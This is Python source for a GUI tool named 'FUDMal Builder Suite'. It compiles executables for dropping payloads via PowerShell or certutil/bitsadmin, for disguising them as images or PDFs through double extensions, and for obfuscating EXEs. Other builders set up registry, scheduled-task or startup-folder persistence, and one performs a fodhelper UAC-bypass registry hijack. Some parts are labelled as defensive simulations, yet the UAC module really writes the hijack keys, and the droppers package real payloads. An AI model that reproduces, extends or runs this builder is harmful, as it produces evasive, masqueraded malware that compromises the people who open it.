_UAC_DELEGATE_KEY  = r"Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute"

def _res(p):
    try:
        return os.path.join(sys._MEIPASS, p)
    except AttributeError:
        return os.path.join(os.path.abspath("."), p)

def _report(body):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Sim -- T1548.002 UAC Bypass", body)
    root.destroy()

def run_simulation():
{vm_call}
    if platform.system() != "Windows":
        _report("[ERROR] Windows-only simulation.")
        return

    import winreg
    lines = [
        "[SIM] UAC Bypass Simulator (fodhelper registry hijack)",
        "[SIM] Technique: MITRE ATT&CK T1548.002",
        "-" * 60,
    ]
    dest_dir = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()), "SimLab")
    os.makedirs(dest_dir, exist_ok=True)
    dest_payload = os.path.join(dest_dir, PAYLOAD_FILENAME)
    try:
        shutil.copy2(_res(PAYLOAD_FILENAME), dest_payload)
        lines.append("[STEP 1] Payload staged: " + dest_payload)
    except Exception as _e:
        lines.append("[ERROR] Stage failed: " + str(_e))
        dest_payload = _res(PAYLOAD_FILENAME)

    # Step 2: Write hijacked handler into HKCU ms-settings\\shell\\open\\command
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, _UAC_REG_KEY) as _hk:
            winreg.SetValueEx(_hk, "", 0, winreg.REG_SZ, dest_payload)
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, _UAC_DELEGATE_KEY) as _hk2:
            winreg.SetValueEx(_hk2, "", 0, winreg.REG_SZ, "")
        lines.append("[STEP 2] Hijacked handler written:")
        lines.append("  HKCU\\\\" + _UAC_REG_KEY)
        lines.append("  Default value -> " + dest_payload)
        lines.append("  DelegateExecute key created (required for bypass)")
    except Exception as _e:
        lines.append("[ERROR] Registry write failed: " + str(_e))

    # Step 3: Show what launching fodhelper would do (do NOT actually launch it)
    fodhelper_path = r"C:\\Windows\\System32\\fodhelper.exe"
    lines.append("[STEP 3] fodhelper.exe path: " + fodhelper_path)
    lines.append("[NOTE] In a real bypass, launching fodhelper.exe would")
    lines.append("       auto-elevate and execute the handler as high-integrity.")
    lines.append("[SIM]  Actual execution is skipped – this is a simulation only.")
{cleanup}
    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")

if __name__ == "__main__":
    run_simulation()
"""
        temp_dir = tempfile.mkdtemp()
        script_path = os.path.join(temp_dir, "uac_bypass_sim.py")
        try:
            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
            with open(script_path, 'w', encoding='utf-8') as fh:
                fh.write(script_content)
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            base_name  = os.path.splitext(final_name)[0]
            sep = ';' if sys.platform.startswith('win') else ':'
            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', base_name,
                '--add-data', payload_name + sep + '.',
                script_path,
            ]
            print("[INFO] Compiling...")
            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
            final_dest = os.path.join(output_dir, final_name)
            shutil.move(dist_exe, final_dest)
            print(f"[SUCCESS] Simulator created: {final_dest}")
            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
        except Exception as e:
            print(f"[ERROR] {e}")
            _ui_notify(log_widget, "error", "Error", str(e))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr


class LogicCmdDropper:
    """Simulates MITRE ATT&CK T1059.003 – Windows Command Shell dropper.

    Generates a compiled exe that, when run in the lab:
      1. Builds a cmd.exe command using certutil -urlcache -f to download
         the payload (a common living-off-the-land technique)
      2. Displays a detailed simulation report popup showing the exact
         cmd.exe command that would be executed
      3. Does NOT actually connect to the network or execute certutil
         (safe simulation)
    """

    @staticmethod
    def build(url, download_path, filename, delay_start,
              output_name, output_dir, enable_vm, log_widget):
        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
        sys.stdout = IORedirector(log_widget)
        sys.stderr = IORedirector(log_widget)
        print("[INFO] Starting CMD Dropper Simulator Build...")
        print("[INFO] Technique: MITRE ATT&CK T1059.003 - Windows Command Shell")

        vm_code = VM_CHECK_CODE if enable_vm else ""
        vm_call = (
            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
            if enable_vm else ""
        )
        script_content = f"""import os, sys, platform, tempfile
import tkinter as tk
from tkinter import messagebox
{vm_code}
TARGET_URL    = {url!r}
DEST_DIR      = {download_path!r}
FILENAME      = {filename!r}
DELAY_START   = {delay_start}

def _report(body):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Sim -- T1059.003 CMD Dropper", body)
    root.destroy()

def run_simulation():
{vm_call}
    if platform.system() != "Windows":
        _report("[ERROR] Windows-only simulation.")
        return
    lines = [
        "[SIM] Windows CMD Shell Dropper Simulator",
        "[SIM] Technique: MITRE ATT&CK T1059.003",
        "-" * 60,
    ]
    dest_path = os.path.join(DEST_DIR if os.path.isabs(DEST_DIR)
                             else os.path.join(os.environ.get("USERPROFILE", ""), DEST_DIR),
                             FILENAME)
    # Certutil living-off-the-land download command
    certutil_cmd = (
        f"certutil -urlcache -split -f {{TARGET_URL}} {{dest_path}}"
    )
    # Alternative: bitsadmin (also commonly abused)
    bitsadmin_cmd = (
        f'bitsadmin /transfer SimJob /download /priority normal '
        f'{{TARGET_URL}} {{dest_path}}'
    )
    lines.append(f"[STEP 1] Delay: {{DELAY_START}}s (simulated)")
    lines.append(f"[STEP 2] Target download path: {{dest_path}}")
    lines.append("")
    lines.append("[METHOD A] certutil (T1140 / LOLBAS):")
    lines.append("  " + certutil_cmd)
    lines.append("")
    lines.append("[METHOD B] bitsadmin (T1197 / LOLBAS):")
    lines.append("  " + bitsadmin_cmd)
    lines.append("")
    lines.append("[STEP 3] After download, exec via:")
    lines.append(f"  cmd.exe /c start {{dest_path}}")
    lines.append("[NOTE] None of the above commands were actually executed.")
    lines.append("[SIM]  This is a display-only simulation of the technique.")
    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")

if __name__ == "__main__":
    run_simulation()
"""
        temp_dir = tempfile.mkdtemp()
        script_path = os.path.join(temp_dir, "cmd_dropper_sim.py")
        try:
            with open(script_path, 'w', encoding='utf-8') as fh:
                fh.write(script_content)
            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
            base_name  = os.path.splitext(final_name)[0]
            cmd = [
                'pyinstaller', '--onefile', '--noconsole',
                '--name', base_name,
                script_path,
            ]
            print("[INFO] Compiling...")
            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
            final_dest = os.path.join(output_dir, final_name)
            shutil.move(dist_exe, final_dest)
            print(f"[SUCCESS] Simulator created: {final_dest}")
            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
        except Exception as e:
            print(f"[ERROR] {e}")
            _ui_notify(log_widget, "error", "Error", str(e))
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr


# =============================================================================
# MAIN GUI APPLICATION
# =============================================================================

class UnifiedBuilderApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("FUDMal Builder Suite")
        self.geometry("920x800")
        self.configure(bg='#1A1A1A')
        
        self.style = ttk.Style(self)
        self.style.theme_use('clam')
        self._configure_styles()
        
        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Initialize Tabs
        self.init_config_tab()
        self.init_sfx_tab()
        self.init_obfus_tab()
        self.init_pdf_tab()
        self.init_reg_persist_tab()
        self.init_schtask_tab()
        self.init_startup_tab()
        self.init_uac_bypass_tab()
        self.init_cmd_dropper_tab()

    def _configure_styles(self):
        self.style.configure('.', background='#1A1A1A', foreground='#22C55E')
        self.style.configure('TFrame', background='#1A1A1A')
        self.style.configure('TLabel', background='#1A1A1A', foreground='#E0E0E0', font=('Consolas', 10))
        self.style.configure('TEntry', background='#333', foreground='#E0E0E0', fieldbackground='#333')
        self.style.configure('TCheckbutton', background='#1A1A1A', foreground='#E0E0E0', font=('Consolas', 10))
        self.style.map('TCheckbutton', background=[('active', '#1A1A1A')])
        self.style.configure('TButton', background='#0052CC', foreground='#FFF', font=('Consolas', 11, 'bold'), borderwidth=0)
        self.style.map('TButton', background=[('active', '#0040A0')], foreground=[('active', '#FFF')])
        self.style.configure('TNotebook', background='#1A1A1A', borderwidth=0)
        self.style.configure('TNotebook.Tab', background='#333', foreground='#E0E0E0', padding=[10, 5], font=('Consolas', 10, 'bold'))
        self.style.map('TNotebook.Tab', background=[('selected', '#22C55E')], foreground=[('selected', '#1A1A1A')])

    # --- SHARED WIDGET HELPERS ---
    def add_label_entry(self, parent, text, default="", width=None):
        f = ttk.Frame(parent)
        f.pack(fill='x', pady=5)
        ttk.Label(f, text=text, width=25).pack(side=tk.LEFT, anchor='w')
        var = tk.StringVar(value=default)
        e = ttk.Entry(f, textvariable=var, width=width or 50)
        e.pack(side=tk.LEFT, fill='x', expand=True, padx=5)
        return var

    def add_file_selector(self, parent, text, is_dir=False, filetypes=None):
        f = ttk.Frame(parent)
        f.pack(fill='x', pady=5)
        ttk.Label(f, text=text, width=25).pack(side=tk.LEFT, anchor='w')
        var = tk.StringVar()
        e = ttk.Entry(f, textvariable=var)
        e.pack(side=tk.LEFT, fill='x', expand=True, padx=5)
        
        def browse():
            if is_dir:
                res = filedialog.askdirectory()
            else:
                res = filedialog.askopenfilename(filetypes=filetypes)
            if res: var.set(res)
            
        btn_txt = "Dir" if is_dir else "File"
        ttk.Button(f, text=btn_txt, command=browse, width=8).pack(side=tk.LEFT)
        return var

    def add_label_combobox(self, parent, text, values, default=None):
        f = ttk.Frame(parent)
        f.pack(fill='x', pady=5)
        ttk.Label(f, text=text, width=25).pack(side=tk.LEFT, anchor='w')
        var = tk.StringVar(value=default or values[0])
        cb = ttk.Combobox(f, textvariable=var, values=values, state='readonly', width=20)
        cb.pack(side=tk.LEFT, padx=5)
        return var

    def create_log_area(self, parent):
        ttk.Label(parent, text="Process Log:", foreground='#888').pack(pady=(10,0), anchor='w')
        f = ttk.Frame(parent)
        f.pack(fill='both', expand=True)
        t = tk.Text(f, height=10, bg='#222', fg='#0F0', font=('Consolas', 9), bd=0)
        t.pack(side=tk.LEFT, fill='both', expand=True)
        s = ttk.Scrollbar(f, command=t.yview)
        s.pack(side=tk.RIGHT, fill='y')
        t.config(yscrollcommand=s.set)
        return t

    # --- TAB 1: CONFIG GENERATOR (Dropper) ---
    def init_config_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="Dropper Gen")
        
        ttk.Label(tab, text="PowerShell Config Dropper", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: T1059.001 (PowerShell)  |  T1105 (Ingress Tool Transfer)",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
        
        self.c_url = self.add_label_entry(tab, "Source URL:", "http://192.168.146.129:8000/base.exe")
        self.c_path = self.add_label_entry(tab, "Install Path:", "Downloads\\")
        self.c_fname = self.add_label_entry(tab, "Final Filename:", "service.exe")
        
        f_delays = ttk.Frame(tab)
        f_delays.pack(fill='x', pady=5)
        ttk.Label(f_delays, text="Delay Start (s):").pack(side=tk.LEFT)
        self.c_d_start = ttk.Entry(f_delays, width=5)
        self.c_d_start.insert(0, "3")
        self.c_d_start.pack(side=tk.LEFT, padx=5)
        ttk.Label(f_delays, text="Post-DL Wait (s):").pack(side=tk.LEFT, padx=(10,0))
        self.c_d_wait = ttk.Entry(f_delays, width=5)
        self.c_d_wait.insert(0, "5")
        self.c_d_wait.pack(side=tk.LEFT, padx=5)

        self.c_vm = tk.BooleanVar(value=False)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.c_vm).pack(anchor='w', pady=10)

        ttk.Button(tab, text="GENERATE .EXE", command=self.run_config_gen).pack(fill='x', pady=10)
        self.c_log = self.create_log_area(tab)

    def run_config_gen(self):
        url = self.c_url.get()
        path = self.c_path.get()
        fname = self.c_fname.get()
        if not all([url, path, fname]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        try:
            d_start = int(self.c_d_start.get())
            d_wait = int(self.c_d_wait.get())
        except:
            messagebox.showerror("Error", "Delays must be integers.")
            return

        out_path = filedialog.asksaveasfilename(defaultextension=".exe", filetypes=[("EXE", "*.exe")])
        if not out_path: return

        self.c_log.delete(1.0, tk.END)
        threading.Thread(target=LogicConfigGen.generate, 
                         args=(url, path, fname, d_start, d_wait, self.c_vm.get(), out_path, self.c_log)).start()

    # --- TAB 2: SFX BUILDER ---
    def init_sfx_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="SFX Builder")
        
        ttk.Label(tab, text="SFX Decoy Dropper (Img/Doc)", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: T1036.007 (Double File Extension Masquerading)",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
        
        self.s_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.s_decoy = self.add_file_selector(tab, "Decoy File:", False, [("All", "*.*")])
        self.s_name = self.add_label_entry(tab, "Output Name:", "Cat.png.exe")
        self.s_dir = self.add_file_selector(tab, "Output Dir:", True)
        
        self.s_vm = tk.BooleanVar(value=False)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.s_vm).pack(anchor='w', pady=10)

        ttk.Button(tab, text="BUILD SFX", command=self.run_sfx).pack(fill='x', pady=10)
        self.s_log = self.create_log_area(tab)

    def run_sfx(self):
        if not all([self.s_payload.get(), self.s_decoy.get(), self.s_name.get(), self.s_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.s_log.delete(1.0, tk.END)
        threading.Thread(target=LogicSFX.build,
                         args=(self.s_payload.get(), self.s_decoy.get(), self.s_name.get(), 
                               self.s_dir.get(), self.s_vm.get(), self.s_log, False)).start()

    # --- TAB 3: OBFUSCATOR ---
    def init_obfus_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="Obfuscator")
        
        ttk.Label(tab, text="Custom Cipher EXE Encoder", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: T1027 (Obfuscated Files or Information)",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
        
        self.o_exe = self.add_file_selector(tab, "Original EXE:", False, [("EXE", "*.exe")])
        self.o_key = self.add_label_entry(tab, "Version Key:", "1.0.0")
        self.o_name = self.add_label_entry(tab, "Output Name:", "Crypt.exe")
        self.o_dir = self.add_file_selector(tab, "Output Dir:", True)

        self.o_vm = tk.BooleanVar(value=False)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.o_vm).pack(anchor='w', pady=10)

        ttk.Button(tab, text="ENCRYPT & BUILD", command=self.run_obfus).pack(fill='x', pady=10)
        self.o_log = self.create_log_area(tab)

    def run_obfus(self):
        if not all([self.o_exe.get(), self.o_key.get(), self.o_name.get(), self.o_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.o_log.delete(1.0, tk.END)
        threading.Thread(target=LogicObfuscator.build,
                         args=(self.o_exe.get(), self.o_key.get(), self.o_name.get(), 
                               self.o_dir.get(), self.o_vm.get(), self.o_log)).start()

    # --- TAB 4: PDF DROPPER ---
    def init_pdf_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="PDF Dropper")
        
        ttk.Label(tab, text="PDF Decoy Dropper (Req: pdf.ico)", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: T1036.007 (Double File Extension Masquerading)",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
        
        self.p_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.p_decoy = self.add_file_selector(tab, "Decoy PDF:", False, [("PDF", "*.pdf")])
        self.p_name = self.add_label_entry(tab, "Output Name:", "Report.pdf.exe")
        self.p_dir = self.add_file_selector(tab, "Output Dir:", True)

        self.p_vm = tk.BooleanVar(value=False)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.p_vm).pack(anchor='w', pady=10)

        ttk.Button(tab, text="BUILD PDF DROPPER", command=self.run_pdf).pack(fill='x', pady=10)
        self.p_log = self.create_log_area(tab)

    def run_pdf(self):
        if not all([self.p_payload.get(), self.p_decoy.get(), self.p_name.get(), self.p_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        if not os.path.exists("pdf.ico"):
            messagebox.showwarning("Missing Icon", "pdf.ico must be in the script directory.")
            return
        self.p_log.delete(1.0, tk.END)
        threading.Thread(target=LogicSFX.build, # Reusing SFX logic with is_pdf_mode=True
                         args=(self.p_payload.get(), self.p_decoy.get(), self.p_name.get(), 
                               self.p_dir.get(), self.p_vm.get(), self.p_log, True)).start()

    # --- TAB 5: REGISTRY PERSISTENCE SIMULATOR ---
    def init_reg_persist_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="Reg Persist")

        ttk.Label(tab, text="Registry Run Key Persistence Sim", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: MITRE ATT&CK T1547.001 - Registry Run Keys / Startup Folder",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))

        self.rp_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.rp_key     = self.add_label_entry(tab, "Registry Key Name:", "SimPersistenceKey")
        self.rp_name    = self.add_label_entry(tab, "Output Name:", "RegPersistSim.exe")
        self.rp_dir     = self.add_file_selector(tab, "Output Dir:", True)

        self.rp_vm      = tk.BooleanVar(value=False)
        self.rp_cleanup = tk.BooleanVar(value=True)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.rp_vm).pack(anchor='w', pady=3)
        ttk.Checkbutton(tab, text="Enable Cleanup (remove key after simulation)", variable=self.rp_cleanup).pack(anchor='w', pady=3)

        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_reg_persist).pack(fill='x', pady=10)
        self.rp_log = self.create_log_area(tab)

    def run_reg_persist(self):
        if not all([self.rp_payload.get(), self.rp_key.get(), self.rp_name.get(), self.rp_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.rp_log.delete(1.0, tk.END)
        threading.Thread(
            target=LogicRegistryPersistence.build,
            args=(self.rp_payload.get(), self.rp_key.get(), self.rp_name.get(),
                  self.rp_dir.get(), self.rp_vm.get(), self.rp_cleanup.get(), self.rp_log)
        ).start()

    # --- TAB 6: SCHEDULED TASK SIMULATOR ---
    def init_schtask_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="Sched Task")

        ttk.Label(tab, text="Scheduled Task Persistence Sim", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: MITRE ATT&CK T1053.005 - Scheduled Task/Job",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))

        self.st_payload  = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.st_taskname = self.add_label_entry(tab, "Task Name:", "SimTaskDemo")
        self.st_trigger  = self.add_label_combobox(tab, "Trigger:", ["ONLOGON", "DAILY"], "ONLOGON")
        self.st_name     = self.add_label_entry(tab, "Output Name:", "SchedTaskSim.exe")
        self.st_dir      = self.add_file_selector(tab, "Output Dir:", True)

        self.st_vm      = tk.BooleanVar(value=False)
        self.st_cleanup = tk.BooleanVar(value=True)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.st_vm).pack(anchor='w', pady=3)
        ttk.Checkbutton(tab, text="Enable Cleanup (delete task after simulation)", variable=self.st_cleanup).pack(anchor='w', pady=3)

        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_schtask).pack(fill='x', pady=10)
        self.st_log = self.create_log_area(tab)

    def run_schtask(self):
        if not all([self.st_payload.get(), self.st_taskname.get(), self.st_name.get(), self.st_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.st_log.delete(1.0, tk.END)
        threading.Thread(
            target=LogicScheduledTask.build,
            args=(self.st_payload.get(), self.st_taskname.get(), self.st_trigger.get(),
                  self.st_name.get(), self.st_dir.get(), self.st_vm.get(),
                  self.st_cleanup.get(), self.st_log)
        ).start()

    # --- TAB 7: STARTUP FOLDER SIMULATOR ---
    def init_startup_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="Startup Folder")

        ttk.Label(tab, text="Startup Folder Persistence Sim", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: MITRE ATT&CK T1547.001 - Startup Folder",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))

        self.sf_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.sf_name    = self.add_label_entry(tab, "Output Name:", "StartupSim.exe")
        self.sf_dir     = self.add_file_selector(tab, "Output Dir:", True)

        self.sf_vm      = tk.BooleanVar(value=False)
        self.sf_cleanup = tk.BooleanVar(value=True)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.sf_vm).pack(anchor='w', pady=3)
        ttk.Checkbutton(tab, text="Enable Cleanup (remove from startup folder after sim)", variable=self.sf_cleanup).pack(anchor='w', pady=3)

        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_startup).pack(fill='x', pady=10)
        self.sf_log = self.create_log_area(tab)

    def run_startup(self):
        if not all([self.sf_payload.get(), self.sf_name.get(), self.sf_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.sf_log.delete(1.0, tk.END)
        threading.Thread(
            target=LogicStartupFolder.build,
            args=(self.sf_payload.get(), self.sf_name.get(), self.sf_dir.get(),
                  self.sf_vm.get(), self.sf_cleanup.get(), self.sf_log)
        ).start()

    # --- TAB 8: UAC BYPASS SIMULATOR ---
    def init_uac_bypass_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="UAC Bypass")

        ttk.Label(tab, text="UAC Bypass Sim (fodhelper hijack)", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: MITRE ATT&CK T1548.002 - Bypass UAC via fodhelper registry hijack",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))

        self.ub_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.ub_name    = self.add_label_entry(tab, "Output Name:", "UACBypassSim.exe")
        self.ub_dir     = self.add_file_selector(tab, "Output Dir:", True)

        self.ub_vm      = tk.BooleanVar(value=False)
        self.ub_cleanup = tk.BooleanVar(value=True)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.ub_vm).pack(anchor='w', pady=3)
        ttk.Checkbutton(tab, text="Enable Cleanup (remove registry key after simulation)", variable=self.ub_cleanup).pack(anchor='w', pady=3)

        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_uac_bypass).pack(fill='x', pady=10)
        self.ub_log = self.create_log_area(tab)

    def run_uac_bypass(self):
        if not all([self.ub_payload.get(), self.ub_name.get(), self.ub_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.ub_log.delete(1.0, tk.END)
        threading.Thread(
            target=LogicUACBypass.build,
            args=(self.ub_payload.get(), self.ub_name.get(), self.ub_dir.get(),
                  self.ub_vm.get(), self.ub_cleanup.get(), self.ub_log)
        ).start()

    # --- TAB 9: CMD DROPPER SIMULATOR ---
    def init_cmd_dropper_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="CMD Dropper")

        ttk.Label(tab, text="CMD Shell Dropper Sim (certutil/bitsadmin)", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: MITRE ATT&CK T1059.003 - Windows Command Shell (LOLBAS)",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))

        self.cd_url    = self.add_label_entry(tab, "Source URL:", "http://192.168.1.100:8000/payload.exe")
        self.cd_path   = self.add_label_entry(tab, "Download Dir:", "Downloads\\")
        self.cd_fname  = self.add_label_entry(tab, "Filename:", "update.exe")

        f_delay = ttk.Frame(tab)
        f_delay.pack(fill='x', pady=5)
        ttk.Label(f_delay, text="Delay Start (s):").pack(side=tk.LEFT)
        self.cd_delay = ttk.Entry(f_delay, width=5)
        self.cd_delay.insert(0, "3")
        self.cd_delay.pack(side=tk.LEFT, padx=5)

        self.cd_name   = self.add_label_entry(tab, "Output Name:", "CmdDropperSim.exe")
        self.cd_dir    = self.add_file_selector(tab, "Output Dir:", True)

        self.cd_vm = tk.BooleanVar(value=False)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.cd_vm).pack(anchor='w', pady=5)

        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_cmd_dropper).pack(fill='x', pady=10)
        self.cd_log = self.create_log_area(tab)

    def run_cmd_dropper(self):
        if not all([self.cd_url.get(), self.cd_path.get(), self.cd_fname.get(),
                    self.cd_name.get(), self.cd_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        try:
            delay = int(self.cd_delay.get())
        except ValueError:
            messagebox.showerror("Error", "Delay must be an integer.")
            return
        self.cd_log.delete(1.0, tk.END)
        threading.Thread(
            target=LogicCmdDropper.build,
            args=(self.cd_url.get(), self.cd_path.get(), self.cd_fname.get(),
                  delay, self.cd_name.get(), self.cd_dir.get(),
                  self.cd_vm.get(), self.cd_log)
        ).start()

if __name__ == "__main__":
    app = UnifiedBuilderApp()
    try:
        app.iconbitmap("FUDMal.ico")
    except Exception:
        pass
    app.mainloop()
